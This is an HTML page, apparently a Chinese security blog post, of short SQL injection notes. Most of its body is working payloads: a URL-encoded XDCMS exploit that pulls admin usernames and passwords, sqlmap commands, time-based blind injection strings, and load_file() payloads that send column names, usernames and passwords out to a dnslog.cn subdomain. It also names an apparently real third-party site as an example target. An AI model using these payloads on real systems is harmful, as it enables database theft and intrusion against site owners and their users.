@@ -1,0 +1,282 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>其他注入漏洞 | pony686</title>
+<link rel="shortcut icon" href="https://itxz.fun/favicon.ico?v=1601777037443">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://itxz.fun/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="其他注入漏洞 | pony686 - Atom Feed" href="https://itxz.fun/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="PART 1:  各种提交方式注入的挖掘
+常见的提交方式
+GET
+POST
+COOKIE
+HEAD
+PUT
+OPTION
+GET注入
+get注入比较常见
+例如：
+www.cracer.com/new.asp?id=11&amp;ssid=1..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://itxz.fun">
+  <img class="avatar" src="https://itxz.fun/images/avatar.png?v=1601777037443" alt="">
+  </a>
+  <h1 class="site-title">
+    pony686
+  </h1>
+  <p class="site-description">
+    pony686
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          python
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://itxz.fun" class="menu" target="_blank">
+          web安全
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              其他注入漏洞
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-09
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>PART 1:  各种提交方式注入的挖掘<br>
+常见的提交方式<br>
+GET<br>
+POST<br>
+COOKIE<br>
+HEAD<br>
+PUT<br>
+OPTION<br>
+GET注入<br>
+get注入比较常见<br>
+例如：<br>
+www.cracer.com/new.asp?id=11&amp;ssid=123&amp;bid=55<br>
+And 1=1<br>
+And 1=2<br>
+/ -0<br>
+‘    %bf’</p>
+<p>POST注入<br>
+post提交方式主要适用于表单的提交<br>
+可能存在漏洞的位置：<br>
+搜索框、登录、留言、注册<br>
+挖掘的时候注入魔术引号<br>
+例如：<br>
+www.cracer.com/admin.php<br>
+测试站点：<br>
+http://testasp.vulnweb.com/login.asp?tfUPass=&amp;tfUName=<br>
+测试工具<br>
+pangolin  sqlmap<br>
+Xdcms +burp注入</p>
+<p>“<br>
+XDCMS全版本存在sql注入漏洞</p>
+<p>需要使用代理抓包改包工具进行完成。</p>
+<p>sql exp<br>
+%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23</p>
+<p>POST注入利用工具</p>
+<p>pangolin<br>
+sqlmap<br>
+sqlmap -u  http://testasp.vulnweb.com/login.asp --data &quot;tfUPass=1&amp;tfUName=1&quot;<br>
+POST 手工</p>
+<p>http头注入<br>
+x-forwarded-for.  1.1.1.1<br>
+client-ip 1.1.1.1<br>
+referrer</p>
+<p>安全性比较高的站点<br>
+会记录你ip的网站可能存在<br>
+投资理财<br>
+资金盘 记录ip<br>
+留言<br>
+贴吧</p>
+<p>用户上传<br>
+xss居多</p>
+<p>伪静态注入<br>
+http://zcb.sxjgjt.com.cn/<br>
+http://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131.html<br>
+http://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131<br>
+www.cracer.com/xxx_html_id+123<br>
+Cracer.com/sfcxdf/sfsdfs/?445.html<br>
+Aspcms<br>
+phpweb</p>
+<p>PART 3:  延迟注入漏洞</p>
+<p>延迟注入<br>
+延时注入是通过页面返回的时间来判断的<br>
+不同的mysql数据库版本，延迟注入语句也不同<br>
+mysql &gt;=5.0  的可以使用sleep()进行查询<br>
+mysql&lt;5.0  的可以使用benchmark()进行查询<br>
+benchmark用法<br>
+benchmark(n,sql语句)  n为查询次数<br>
+通过查询次数增多 时间变得缓慢来判断是否存在延迟<br>
+select benchmark(1000,select * from admin) ;</p>
+<p>延迟注入<br>
+sleep()延迟注入用法<br>
+sleep 可以强制产生一个固定的延迟。<br>
+sleep()延迟注入核心原理<br>
+and if(true,sleep(5),0); ==IF(1=1, true, false);<br>
+id=1 and sleep(5)  判断下是否存在延迟注入<br>
+and if(substring(user(),1,4)='root',sleep(5),1) 判断当前用户<br>
+and if(MID(version(),1,1) LIKE 5, sleep(5), 1)  判断数据库版本信息是否为5<br>
+可以去猜解他的数据库名称<br>
+and if(ascii(substring(database(),1,4))&gt;100,sleep(5),1)<br>
+and If(ascii(substr(database(),1,1))&lt;115,sleep(10),1)--+<br>
+and If(length((version()))=6,sleep(10),1)--+<br>
+sqlmap --time-sec=2  延迟注入<br>
+手工时间盲注<br>
+https://blog.csdn.net/DarkHQ/article/details/79274376</p>
+<p>dnslog 注入<br>
+dnslog 平台会记录域名dns查询记录，通过我们把查询的结果和dns子域名拼接，发送给dnslog平台查询，就会记录我们的语句查询结果，从而快速提升延迟注入速度。<br>
+条件：<br>
+root权限（要借助load_file()函数）</p>
+<p>dns注入列列名<br>
+列列名<br>
+and if((select load_file(concat('\\',(select column_name from information_schema.columns where table_name='user' limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+<br>
+and if((select load_file(concat('\\',(select column_name from information_schema.columns where table_name='user' and TABLE_SCHEMA='dbname' limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+</p>
+<p>第二个列名<br>
+and if((select load_file(concat('\\',(select column_name from information_schema.columns where table_name='user' limit 1,1),'.7dluss.dnslog.cn\abc'))),1,1)--+</p>
+<p>dns注入列数据<br>
+列数据<br>
+and if((select load_file(concat('\\',(select username from user limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+</p>
+<p>and if((select load_file(concat('\\',(select password from user limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+<br>
+PART 4:  BASE64编码注入漏洞<br>
+base64编码注入<br>
+解码<br>
+构造语句<br>
+编码<br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>d</mi><mo>=</mo><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>6</mn><msub><mn>4</mn><mi>d</mi></msub><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">id=base64_decode(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord">6</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mopen">(</span></span></span></span>id);</p>
+<p>app注入挖掘<br>
+利用抓包工具获取app发送到服务器的链接<br>
+burp fiddler即可<br>
+得到链接进行测试</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://itxz.fun/post/oracle-zhu-ru/">
+              <h3 class="post-title">
+                oracle注入
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://itxz.fun/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
